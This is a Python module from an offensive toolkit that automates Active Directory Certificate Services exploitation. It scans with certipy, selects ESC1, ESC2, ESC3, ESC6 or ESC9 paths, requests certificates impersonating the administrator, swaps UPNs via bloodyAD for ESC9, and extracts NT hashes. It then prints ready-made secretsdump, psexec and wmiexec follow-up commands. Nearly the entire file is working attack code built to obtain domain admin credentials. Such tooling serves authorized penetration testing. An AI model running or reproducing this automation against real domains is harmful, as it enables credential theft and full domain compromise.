"""
Automated ADCS Exploitation Module
Scans for ADCS vulnerabilities, identifies exploitable ESC paths,
and auto-exploits to obtain domain admin credentials.

Supports: ESC1, ESC2, ESC3, ESC6, ESC9, ESC11
"""

import json
import os
import re
import shlex
import time
from typing import Dict, List, Optional, Tuple

from core.module_base import ModuleBase, ModuleType, Platform, ModuleResult
from modules.ad.certipy_find import _find_certipy


# ESC attack metadata
ESC_INFO = {
    "ESC1": {
        "name": "Enrollee Supplies Subject",
        "risk": "CRITICAL",
        "description": "Template allows enrollee to specify SAN. Request cert as any user.",
        "requires": "enrollment rights on template",
        "steps": ["Request cert with -upn administrator@domain", "Authenticate with PFX"],
    },
    "ESC2": {
        "name": "Any Purpose EKU",
        "risk": "CRITICAL",
        "description": "Template has Any Purpose or SubCA EKU. Can be used for client auth as any user.",
        "requires": "enrollment rights + EnrolleeSuppliesSubject on template",
        "steps": ["Request cert with -upn administrator@domain", "Authenticate with PFX"],
    },
    "ESC3": {
        "name": "Enrollment Agent",
        "risk": "HIGH",
        "description": "Template has Certificate Request Agent EKU. Request certs on behalf of others.",
        "requires": "enrollment rights on agent template + target template (e.g. User)",
        "steps": [
            "Request enrollment agent cert (no UPN override)",
            "Use agent cert to request cert on-behalf-of administrator via User template",
            "Authenticate with resulting PFX",
        ],
    },
    "ESC6": {
        "name": "EDITF_ATTRIBUTESUBJECTALTNAME2",
        "risk": "CRITICAL",
        "description": "CA policy allows user-specified SAN on any template.",
        "requires": "enrollment rights on any template with client auth",
        "steps": ["Request cert on any template with -upn administrator@domain", "Authenticate with PFX"],
    },
    "ESC8": {
        "name": "HTTP Web Enrollment (NTLM Relay)",
        "risk": "HIGH",
        "description": "Web enrollment enabled over HTTP. Relay NTLM auth to request certs.",
        "requires": "NTLM relay position (e.g. PetitPotam, PrinterBug)",
        "steps": ["Start ntlmrelayx targeting http://CA/certsrv/certfnsh.asp", "Trigger auth coercion"],
    },
    "ESC9": {
        "name": "No Security Extension (CT_FLAG_NO_SECURITY_EXTENSION)",
        "risk": "HIGH",
        "description": "Template omits SID from cert. UPN swap + cert request = impersonation.",
        "requires": "GenericWrite on another user + enrollment rights on template",
        "steps": [
            "Change target user UPN to administrator@domain",
            "Request cert for target user via this template",
            "Restore target user UPN",
            "Authenticate with PFX (KDC resolves by UPN, finds administrator)",
        ],
    },
    "ESC11": {
        "name": "ICPR No Encryption",
        "risk": "MEDIUM",
        "description": "RPC enrollment not enforcing encryption. NTLM relay via RPC.",
        "requires": "NTLM relay position",
        "steps": ["Relay NTLM auth to CA RPC endpoint"],
    },
    "ESC15": {
        "name": "Schema V1 + EnrolleeSuppliesSubject",
        "risk": "HIGH",
        "description": "Schema version 1 template with SAN control. Similar to ESC1 but may need patching.",
        "requires": "enrollment rights + unpatched environment (CVE-2024-49019)",
        "steps": ["Same as ESC1"],
    },
}


class ADCSAutoExploit(ModuleBase):
    """
    Automated ADCS exploitation module.
    Scans for vulnerabilities, parses results, identifies best attack path,
    and can auto-exploit ESC1/2/3/6/9 to obtain domain admin credentials.
    """

    def __init__(self):
        super().__init__()
        self.name = "adcs_auto"
        self.description = "Automated ADCS vulnerability scanner and exploiter (ESC1-ESC15)"
        self.author = "UwU Toolkit"
        self.version = "2.0.0"
        self.module_type = ModuleType.AUXILIARY
        self.platform = Platform.WINDOWS
        self.tags = [
            "ad", "adcs", "certificate", "certipy", "automated",
            "esc1", "esc2", "esc3", "esc6", "esc8", "esc9", "esc11", "esc15",
        ]
        self.references = [
            "https://github.com/ly4k/Certipy",
            "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
            "https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88571f7",
        ]
        self.opsec_rating = "medium"
        self.opsec_notes = "Certificate requests are logged in CA event logs"

        self.provides = ["credentials", "certificates"]
        self.consumes = ["credentials"]
        self.suggested_next = [
            ("auxiliary/ad/secretsdump", "DCSync with obtained hash"),
            ("auxiliary/ad/psexec", "Remote exec with obtained hash"),
        ]

        # Core options
        self.register_option("RHOSTS", "Domain Controller IP", required=True)
        self.register_option("DOMAIN", "Domain name (e.g. westeros.local)", required=True)
        self.register_option("USER", "Domain username with enrollment rights", required=True)
        self.register_option("PASS", "Password for USER", required=True)
        self.register_option("TARGET_USER", "User to impersonate", default="administrator")

        # Action control
        self.register_option("ACTION", "Action to perform",
                           default="auto",
                           choices=["scan", "auto", "exploit"])
        self.register_option("ESC", "Force specific ESC type (auto-detect if empty)",
                           default="")
        self.register_option("TEMPLATE", "Force specific template (auto-detect if empty)",
                           default="")
        self.register_option("CA", "Certificate Authority name (auto-detect if empty)",
                           default="")

        # ESC9 specific
        self.register_option("ESC9_TARGET", "User with GenericWrite (for ESC9 UPN swap)",
                           default="")

        # ESC3 specific
        self.register_option("ESC3_TARGET_TEMPLATE", "Target template for on-behalf-of (ESC3)",
                           default="User")

        # Output
        self.register_option("OUTPUT_DIR", "Directory for output files", default="/tmp/adcs_auto")

        # Internal state
        self._scan_results = {}
        self._ca_name = ""
        self._exploitable = []

    def run(self) -> bool:
        dc_ip = self.get_option("RHOSTS")
        domain = self.get_option("DOMAIN")
        user = self.get_option("USER")
        password = self.get_option("PASS")
        target_user = self.get_option("TARGET_USER")
        action = self.get_option("ACTION")
        output_dir = self.get_option("OUTPUT_DIR")

        certipy = _find_certipy()
        self.print_line()
        self.print_status(f"ADCS Auto-Exploit v{self.version}")
        self.print_status(f"DC: {dc_ip} | Domain: {domain} | User: {user}")
        self.print_status(f"Target: {target_user} | Action: {action}")
        self.print_line()

        # Ensure output directory
        os.makedirs(output_dir, exist_ok=True)
        orig_dir = os.getcwd()
        os.chdir(output_dir)

        try:
            # Phase 1: Scan
            self.print_status("=" * 60)
            self.print_status("PHASE 1: SCANNING FOR ADCS VULNERABILITIES")
            self.print_status("=" * 60)

            scan_ok = self._scan(certipy, dc_ip, domain, user, password)
            if not scan_ok:
                return False

            # Phase 2: Analyze
            self.print_line()
            self.print_status("=" * 60)
            self.print_status("PHASE 2: ANALYZING ATTACK PATHS")
            self.print_status("=" * 60)

            self._analyze(domain, user)

            if action == "scan":
                self._print_report()
                return True

            # Phase 3: Exploit
            if not self._exploitable:
                self.print_warning("No auto-exploitable vulnerabilities found")
                self._print_report()
                return False

            self.print_line()
            self.print_status("=" * 60)
            self.print_status("PHASE 3: EXPLOITATION")
            self.print_status("=" * 60)

            return self._exploit(certipy, dc_ip, domain, user, password, target_user)

        finally:
            os.chdir(orig_dir)

    def _scan(self, certipy: str, dc_ip: str, domain: str, user: str, password: str) -> bool:
        """Run certipy find and parse JSON results."""
        output_prefix = os.path.join(self.get_option("OUTPUT_DIR"), "adcs_scan")

        cmd_parts = [
            certipy, "find",
            "-u", f"{user}@{domain}",
            "-p", password,
            "-dc-ip", dc_ip,
            "-target-ip", dc_ip,
            "-vulnerable",
            "-output", output_prefix,
        ]
        cmd = " ".join(shlex.quote(p) for p in cmd_parts)

        self.print_status(f"Running: certipy find -u {user}@{domain} -dc-ip {dc_ip} -vulnerable")
        ret, stdout, stderr = self.run_in_exegol(cmd, timeout=180)

        output_text = stdout + stderr
        self.print_line()
        for line in output_text.split("\n"):
            line = line.strip()
            if line:
                if "[*]" in line or "[+]" in line:
                    self.print_status(line)
                elif "[-]" in line or "[!]" in line:
                    self.print_warning(line)

        # Parse JSON output
        json_file = f"{output_prefix}_Certipy.json"
        # Certipy may mangle path separators in output filename
        alt_json = output_prefix.replace("/", "_").lstrip("_") + "_Certipy.json"

        json_path = None
        for candidate in [json_file, alt_json]:
            if os.path.exists(candidate):
                json_path = candidate
                break
        # Also check in output dir
        if not json_path:
            for f in os.listdir(self.get_option("OUTPUT_DIR")):
                if f.endswith("_Certipy.json"):
                    json_path = os.path.join(self.get_option("OUTPUT_DIR"), f)
                    break
        # Check cwd
        if not json_path:
            for f in os.listdir("."):
                if f.endswith("_Certipy.json"):
                    json_path = f
                    break

        if not json_path:
            self.print_error("Certipy JSON output not found")
            self.print_warning("Falling back to text parsing")
            return self._parse_text_output(output_text)

        self.print_good(f"Parsing JSON output: {json_path}")
        try:
            with open(json_path, "r") as f:
                self._scan_results = json.load(f)
        except (json.JSONDecodeError, IOError) as e:
            self.print_error(f"Failed to parse JSON: {e}")
            return False

        return True

    def _parse_text_output(self, text: str) -> bool:
        """Fallback parser for certipy text output."""
        # Extract CA name
        ca_match = re.search(r"CA Name\s*:\s*(.+)", text)
        if ca_match:
            self._ca_name = ca_match.group(1).strip()
            self.print_good(f"CA: {self._ca_name}")

        # This is a simplified fallback — JSON parsing is preferred
        self.print_warning("Text parsing is limited. Check certipy output manually.")
        return True

    def _analyze(self, domain: str, user: str):
        """Analyze scan results and identify exploitable paths."""
        data = self._scan_results

        # Extract CA info
        cas = data.get("Certificate Authorities", {})
        for ca_key, ca_info in cas.items():
            ca_name = ca_info.get("CA Name", "")
            if ca_name:
                self._ca_name = ca_name
                self.print_good(f"Certificate Authority: {ca_name}")

            # Check CA-level vulns — certipy v5 uses "[!] Vulnerabilities" key
            ca_vulns = ca_info.get("[!] Vulnerabilities", ca_info.get("Vulnerabilities", {}))
            if isinstance(ca_vulns, dict):
                for vuln_name, vuln_detail in ca_vulns.items():
                    esc_type = vuln_name.strip()
                    info = ESC_INFO.get(esc_type, {})
                    risk = info.get("risk", "UNKNOWN")
                    desc = info.get("description", str(vuln_detail))
                    self.print_warning(f"  CA Vulnerability: {esc_type} [{risk}] - {desc}")

                    if esc_type == "ESC6":
                        self._exploitable.append({
                            "esc": "ESC6",
                            "template": None,
                            "ca": ca_name,
                            "risk": "CRITICAL",
                            "auto": True,
                            "enrollable": True,
                            "info": info,
                        })

            # Detect ESC6 from "User Specified SAN" field
            user_san = ca_info.get("User Specified SAN", "")
            if isinstance(user_san, str) and user_san.lower() in ("enabled", "yes"):
                if not any(v["esc"] == "ESC6" for v in self._exploitable):
                    info = ESC_INFO.get("ESC6", {})
                    self.print_warning(f"  CA: User Specified SAN = Enabled → ESC6 [{info.get('risk', 'CRITICAL')}]")
                    self._exploitable.append({
                        "esc": "ESC6",
                        "template": None,
                        "ca": ca_name,
                        "risk": "CRITICAL",
                        "auto": True,
                        "enrollable": True,
                        "info": info,
                    })

            # Detect ESC8 from web enrollment
            web_enroll = ca_info.get("Web Enrollment", {})
            http_enabled = False
            if isinstance(web_enroll, dict):
                http_info = web_enroll.get("http", web_enroll.get("HTTP", {}))
                if isinstance(http_info, dict):
                    http_enabled = http_info.get("enabled", http_info.get("Enabled", False))
                elif isinstance(http_info, bool):
                    http_enabled = http_info
            if http_enabled:
                info = ESC_INFO.get("ESC8", {})
                self.print_warning(f"  CA: Web Enrollment over HTTP → ESC8 [{info.get('risk', 'HIGH')}]")
                self._exploitable.append({
                    "esc": "ESC8",
                    "template": None,
                    "ca": ca_name,
                    "risk": "HIGH",
                    "auto": False,
                    "enrollable": True,
                    "info": info,
                })

        # Extract template vulns
        templates = data.get("Certificate Templates", {})
        for tmpl_key, tmpl_info in templates.items():
            tmpl_name = tmpl_info.get("Template Name", "")
            enabled = tmpl_info.get("Enabled", False)
            if not enabled:
                continue

            # Certipy v5 uses "[!] Vulnerabilities" key
            vulns = tmpl_info.get("[!] Vulnerabilities",
                                  tmpl_info.get("Vulnerabilities", {}))
            if not isinstance(vulns, dict) or not vulns:
                continue

            # Check if user can enroll — use "[+] User Enrollable Principals" first
            user_enrollable = False
            enrollable_principals = tmpl_info.get("[+] User Enrollable Principals", [])
            if isinstance(enrollable_principals, str):
                enrollable_principals = [enrollable_principals]

            if enrollable_principals:
                for principal in enrollable_principals:
                    p_upper = principal.upper()
                    if any(g in p_upper for g in [
                        "DOMAIN USERS", "AUTHENTICATED USERS", "EVERYONE",
                        user.upper(), "DOMAIN COMPUTERS",
                    ]):
                        user_enrollable = True
                        break
            else:
                # Fallback to Permissions structure
                perms = tmpl_info.get("Permissions", {})
                enroll_perms = perms.get("Enrollment Permissions", {})
                enroll_rights = enroll_perms.get("Enrollment Rights", [])
                if isinstance(enroll_rights, str):
                    enroll_rights = [enroll_rights]

                for principal in enroll_rights:
                    p_upper = principal.upper()
                    if any(g in p_upper for g in [
                        "DOMAIN USERS", "AUTHENTICATED USERS", "EVERYONE",
                        user.upper(), "DOMAIN COMPUTERS",
                    ]):
                        user_enrollable = True
                        break

            self.print_line()
            self.print_status(f"Template: {tmpl_name}")
            self.print_status(f"  Enrollable by {user}: {'YES' if user_enrollable else 'NO'}")

            for vuln_name, vuln_detail in vulns.items():
                esc_type = vuln_name.strip()
                info = ESC_INFO.get(esc_type, {})
                risk = info.get("risk", "UNKNOWN")
                desc = info.get("description", str(vuln_detail))

                self.print_warning(f"  {esc_type} [{risk}] - {desc}")

                can_auto = esc_type in ("ESC1", "ESC2", "ESC3", "ESC9", "ESC15")
                if esc_type == "ESC9":
                    esc9_target = self.get_option("ESC9_TARGET")
                    can_auto = bool(esc9_target)
                    if not can_auto:
                        self.print_status(f"    Set ESC9_TARGET to enable auto-exploit")

                self._exploitable.append({
                    "esc": esc_type,
                    "template": tmpl_name,
                    "ca": self._ca_name,
                    "risk": risk,
                    "auto": can_auto and user_enrollable,
                    "enrollable": user_enrollable,
                    "info": info,
                })

        # Sort by exploitability: auto-exploitable first, then by risk
        risk_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "UNKNOWN": 4}
        self._exploitable.sort(key=lambda x: (
            0 if x["auto"] else 1,
            risk_order.get(x["risk"], 4),
        ))

    def _print_report(self):
        """Print analysis report with recommendations."""
        self.print_line()
        self.print_status("=" * 60)
        self.print_status("ADCS VULNERABILITY REPORT")
        self.print_status("=" * 60)

        if not self._exploitable:
            self.print_warning("No exploitable ADCS vulnerabilities found")
            return

        self.print_line()
        self.print_good(f"Found {len(self._exploitable)} vulnerability/vulnerabilities:")
        self.print_line()

        for i, vuln in enumerate(self._exploitable):
            esc = vuln["esc"]
            tmpl = vuln.get("template") or "(any template)"
            risk = vuln["risk"]
            auto = vuln["auto"]
            info = vuln.get("info", {})

            prefix = "[AUTO]" if auto else "[MANUAL]"
            self.print_good(f"  {i+1}. {prefix} {esc} [{risk}] via {tmpl}")

            if info.get("steps"):
                for step_num, step in enumerate(info["steps"], 1):
                    self.print_status(f"     Step {step_num}: {step}")

            if not auto and esc == "ESC9":
                self.print_status(f"     Set ESC9_TARGET=<user_with_genericwrite_target> to enable")
            elif not auto and esc in ("ESC8", "ESC11"):
                self.print_status(f"     Requires NTLM relay — use ntlmrelayx manually")

        self.print_line()
        auto_count = sum(1 for v in self._exploitable if v["auto"])
        if auto_count:
            self.print_good(f"{auto_count} attacks can be auto-exploited. Set ACTION=auto to exploit.")
        else:
            self.print_warning("No auto-exploitable attacks. Manual steps required.")

    def _exploit(self, certipy: str, dc_ip: str, domain: str,
                 user: str, password: str, target_user: str) -> bool:
        """Execute the best available attack path."""
        forced_esc = self.get_option("ESC")
        forced_template = self.get_option("TEMPLATE")
        forced_ca = self.get_option("CA")

        # Filter to auto-exploitable
        candidates = [v for v in self._exploitable if v["auto"]]

        if forced_esc:
            candidates = [v for v in candidates if v["esc"] == forced_esc.upper()]
        if forced_template:
            candidates = [v for v in candidates if v.get("template") == forced_template]

        if not candidates:
            self.print_error("No matching auto-exploitable vulnerabilities")
            self._print_report()
            return False

        vuln = candidates[0]
        esc = vuln["esc"]
        template = forced_template or vuln.get("template")
        ca = forced_ca or vuln.get("ca") or self._ca_name

        self.print_good(f"Selected attack: {esc} via template '{template}' on CA '{ca}'")
        self.print_line()

        if esc in ("ESC1", "ESC2", "ESC15"):
            return self._exploit_esc1(certipy, dc_ip, domain, user, password,
                                      target_user, ca, template)
        elif esc == "ESC3":
            return self._exploit_esc3(certipy, dc_ip, domain, user, password,
                                      target_user, ca, template)
        elif esc == "ESC6":
            return self._exploit_esc6(certipy, dc_ip, domain, user, password,
                                      target_user, ca)
        elif esc == "ESC9":
            return self._exploit_esc9(certipy, dc_ip, domain, user, password,
                                      target_user, ca, template)
        else:
            self.print_error(f"Auto-exploitation not implemented for {esc}")
            return False

    def _clean_pfx(self, *names):
        """Remove PFX and ccache files to avoid overwrite prompts."""
        for name in names:
            for ext in (".pfx", ".ccache"):
                try:
                    os.remove(name + ext)
                except FileNotFoundError:
                    pass

    def _request_cert(self, certipy: str, dc_ip: str, domain: str,
                      user: str, password: str, ca: str, template: str,
                      upn: str = "", pfx_agent: str = "",
                      on_behalf_of: str = "") -> Tuple[bool, str]:
        """Request a certificate and return (success, pfx_path)."""
        cmd_parts = [
            certipy, "req",
            "-u", f"{user}@{domain}",
            "-p", password,
            "-dc-ip", dc_ip,
            "-target-ip", dc_ip,
            "-ca", ca,
            "-template", template,
        ]
        if upn:
            cmd_parts.extend(["-upn", upn])
        if pfx_agent:
            cmd_parts.extend(["-pfx", pfx_agent])
        if on_behalf_of:
            cmd_parts.extend(["-on-behalf-of", on_behalf_of])

        cmd = " ".join(shlex.quote(p) for p in cmd_parts)
        safe_cmd = cmd.replace(password, "[HIDDEN]")
        self.print_status(f"Requesting: {safe_cmd}")

        ret, stdout, stderr = self.run_in_exegol(cmd, timeout=120)
        output = stdout + stderr

        for line in output.split("\n"):
            line = line.strip()
            if "Successfully requested" in line or "Got certificate" in line:
                self.print_good(f"  {line}")
            elif "Wrote certificate" in line or "Saving certificate" in line:
                self.print_good(f"  {line}")
            elif "error" in line.lower() or "[-]" in line:
                self.print_error(f"  {line}")

        if "Successfully requested certificate" not in output:
            self.print_error("Certificate request failed")
            return False, ""

        # Find the PFX file
        pfx_match = re.search(r"Saving certificate.*?to '(.+?\.pfx)'", output)
        if pfx_match:
            return True, pfx_match.group(1)

        # Try common names
        for candidate in [f"{user.lower()}.pfx", "administrator.pfx"]:
            if os.path.exists(candidate):
                return True, candidate

        return True, ""

    def _auth_cert(self, certipy: str, dc_ip: str, domain: str,
                   pfx_path: str, username: str = "") -> Tuple[bool, str]:
        """Authenticate with a PFX cert and return (success, nt_hash)."""
        cmd_parts = [
            certipy, "auth",
            "-pfx", pfx_path,
            "-domain", domain,
            "-dc-ip", dc_ip,
        ]
        if username:
            cmd_parts.extend(["-username", username])

        cmd = " ".join(shlex.quote(p) for p in cmd_parts)
        self.print_status(f"Authenticating: certipy auth -pfx {pfx_path} -dc-ip {dc_ip}")

        ret, stdout, stderr = self.run_in_exegol(cmd, timeout=60)
        output = stdout + stderr

        nt_hash = ""
        for line in output.split("\n"):
            line = line.strip()
            if "Got hash for" in line:
                self.print_good(f"  {line}")
                hash_match = re.search(r":\s*([a-f0-9]{32}:[a-f0-9]{32})\s*$", line)
                if hash_match:
                    nt_hash = hash_match.group(1)
            elif "Got TGT" in line:
                self.print_good(f"  {line}")
            elif "credential cache" in line:
                self.print_good(f"  {line}")
            elif "KDC_ERR" in line or "error" in line.lower():
                self.print_error(f"  {line}")

        return bool(nt_hash), nt_hash

    def _print_success(self, target_user: str, nt_hash: str, esc_type: str):
        """Print exploitation success banner."""
        self.print_line()
        self.print_good("=" * 60)
        self.print_good(f"TARGET COMPROMISED via {esc_type}")
        self.print_good(f"  User: {target_user}")
        self.print_good(f"  Hash: {nt_hash}")
        self.print_good("=" * 60)
        self.print_line()
        self.print_status("Next steps:")
        self.print_status(f"  1. DCSync:  secretsdump.py {target_user}@DC -hashes {nt_hash}")
        self.print_status(f"  2. PsExec:  psexec.py {target_user}@DC -hashes {nt_hash}")
        self.print_status(f"  3. WmiExec: wmiexec.py {target_user}@DC -hashes {nt_hash}")

    def _exploit_esc1(self, certipy: str, dc_ip: str, domain: str,
                      user: str, password: str, target_user: str,
                      ca: str, template: str) -> bool:
        """ESC1/ESC2/ESC15: Enrollee supplies subject."""
        self.print_status(f"Exploiting ESC1/ESC2 via template '{template}'")

        self._clean_pfx(target_user.lower())

        upn = f"{target_user}@{domain}"
        ok, pfx = self._request_cert(certipy, dc_ip, domain, user, password,
                                      ca, template, upn=upn)
        if not ok:
            return False

        if not pfx:
            pfx = f"{target_user.lower()}.pfx"

        ok, nt_hash = self._auth_cert(certipy, dc_ip, domain, pfx,
                                       username=target_user)
        if ok:
            self._print_success(target_user, nt_hash, "ESC1/ESC2")
            return True

        self.print_error("Authentication failed")
        return False

    def _exploit_esc3(self, certipy: str, dc_ip: str, domain: str,
                      user: str, password: str, target_user: str,
                      ca: str, template: str) -> bool:
        """ESC3: Enrollment Agent → on-behalf-of."""
        target_template = self.get_option("ESC3_TARGET_TEMPLATE")
        self.print_status(f"Exploiting ESC3 via enrollment agent template '{template}'")
        self.print_status(f"Target template for on-behalf-of: '{target_template}'")

        # Step 1: Get enrollment agent cert
        self.print_line()
        self.print_status("Step 1/3: Requesting enrollment agent certificate...")
        self._clean_pfx(user.lower())

        ok, agent_pfx = self._request_cert(certipy, dc_ip, domain, user, password,
                                            ca, template)
        if not ok:
            return False
        if not agent_pfx:
            agent_pfx = f"{user.lower()}.pfx"

        # Step 2: Request cert on behalf of target
        self.print_line()
        self.print_status(f"Step 2/3: Requesting cert on behalf of {target_user}...")
        self._clean_pfx(target_user.lower())

        domain_short = domain.split(".")[0]
        on_behalf = f"{domain_short}\\{target_user}"

        ok, target_pfx = self._request_cert(
            certipy, dc_ip, domain, user, password,
            ca, target_template,
            pfx_agent=agent_pfx,
            on_behalf_of=on_behalf,
        )
        if not ok:
            self.print_error("On-behalf-of request failed")
            return False
        if not target_pfx:
            target_pfx = f"{target_user.lower()}.pfx"

        # Step 3: Authenticate
        self.print_line()
        self.print_status("Step 3/3: Authenticating with certificate...")
        ok, nt_hash = self._auth_cert(certipy, dc_ip, domain, target_pfx,
                                       username=target_user)
        if ok:
            self._print_success(target_user, nt_hash, "ESC3")
            return True

        self.print_error("Authentication failed")
        return False

    def _exploit_esc6(self, certipy: str, dc_ip: str, domain: str,
                      user: str, password: str, target_user: str,
                      ca: str) -> bool:
        """ESC6: CA allows user-specified SAN on any template."""
        # Find any template with client auth that the user can enroll in
        template = self.get_option("TEMPLATE")
        if not template:
            template = "User"  # Default fallback

        self.print_status(f"Exploiting ESC6 via CA SAN policy, template '{template}'")

        self._clean_pfx(target_user.lower())

        upn = f"{target_user}@{domain}"
        ok, pfx = self._request_cert(certipy, dc_ip, domain, user, password,
                                      ca, template, upn=upn)
        if not ok:
            return False
        if not pfx:
            pfx = f"{target_user.lower()}.pfx"

        ok, nt_hash = self._auth_cert(certipy, dc_ip, domain, pfx,
                                       username=target_user)
        if ok:
            self._print_success(target_user, nt_hash, "ESC6")
            return True

        self.print_error("Authentication failed")
        return False

    def _exploit_esc9(self, certipy: str, dc_ip: str, domain: str,
                      user: str, password: str, target_user: str,
                      ca: str, template: str) -> bool:
        """ESC9: No security extension + UPN swap."""
        esc9_target = self.get_option("ESC9_TARGET")
        if not esc9_target:
            self.print_error("ESC9 requires ESC9_TARGET — a user you have GenericWrite on")
            return False

        self.print_status(f"Exploiting ESC9 via template '{template}'")
        self.print_status(f"UPN swap target: {esc9_target}")
        self.print_status(f"Impersonating: {target_user}")

        # Step 1: Change target's UPN
        self.print_line()
        self.print_status(f"Step 1/4: Changing {esc9_target} UPN to {target_user}@{domain}...")
        bloody_cmd = (
            f"bloodyAD -u {shlex.quote(user)} -p {shlex.quote(password)} "
            f"-d {shlex.quote(domain)} -H {shlex.quote(dc_ip)} "
            f"set object {shlex.quote(esc9_target)} userPrincipalName "
            f"-v {shlex.quote(f'{target_user}@{domain}')}"
        )
        ret, stdout, stderr = self.run_in_exegol(bloody_cmd, timeout=30)
        output = stdout + stderr
        if "has been updated" in output:
            self.print_good(f"  UPN changed to {target_user}@{domain}")
        else:
            self.print_error(f"  UPN change failed: {output.strip()}")
            return False

        try:
            # Step 2: Request cert for esc9_target (whose UPN is now target_user)
            self.print_line()
            self.print_status(f"Step 2/4: Requesting cert for {esc9_target}...")
            self._clean_pfx(target_user.lower(), esc9_target.lower())

            ok, pfx = self._request_cert(
                certipy, dc_ip, domain, esc9_target, password,
                ca, template,
            )

            # Step 3: Restore UPN (always do this, even if cert request failed)
            self.print_line()
            self.print_status(f"Step 3/4: Restoring {esc9_target} UPN...")
            restore_cmd = (
                f"bloodyAD -u {shlex.quote(user)} -p {shlex.quote(password)} "
                f"-d {shlex.quote(domain)} -H {shlex.quote(dc_ip)} "
                f"set object {shlex.quote(esc9_target)} userPrincipalName "
                f"-v {shlex.quote(f'{esc9_target}@{domain}')}"
            )
            ret2, stdout2, stderr2 = self.run_in_exegol(restore_cmd, timeout=30)
            if "has been updated" in (stdout2 + stderr2):
                self.print_good(f"  UPN restored to {esc9_target}@{domain}")
            else:
                self.print_warning(f"  UPN restore may have failed: {(stdout2+stderr2).strip()}")

            if not ok:
                return False

        except Exception as e:
            # Always try to restore UPN
            self.print_error(f"Error during ESC9: {e}")
            self.print_status(f"Attempting UPN restore for {esc9_target}...")
            restore_cmd = (
                f"bloodyAD -u {shlex.quote(user)} -p {shlex.quote(password)} "
                f"-d {shlex.quote(domain)} -H {shlex.quote(dc_ip)} "
                f"set object {shlex.quote(esc9_target)} userPrincipalName "
                f"-v {shlex.quote(f'{esc9_target}@{domain}')}"
            )
            self.run_in_exegol(restore_cmd, timeout=30)
            return False

        # Step 4: Authenticate
        if not pfx:
            pfx = f"{target_user.lower()}.pfx"

        self.print_line()
        self.print_status("Step 4/4: Authenticating with certificate...")
        ok, nt_hash = self._auth_cert(certipy, dc_ip, domain, pfx,
                                       username=target_user)
        if ok:
            self._print_success(target_user, nt_hash, "ESC9")
            return True

        self.print_error("Authentication failed")
        return False

    def check(self) -> bool:
        certipy = _find_certipy()
        if certipy != "certipy":
            return True
        ret, stdout, stderr = self.run_in_exegol("which certipy 2>/dev/null", timeout=10)
        return ret == 0
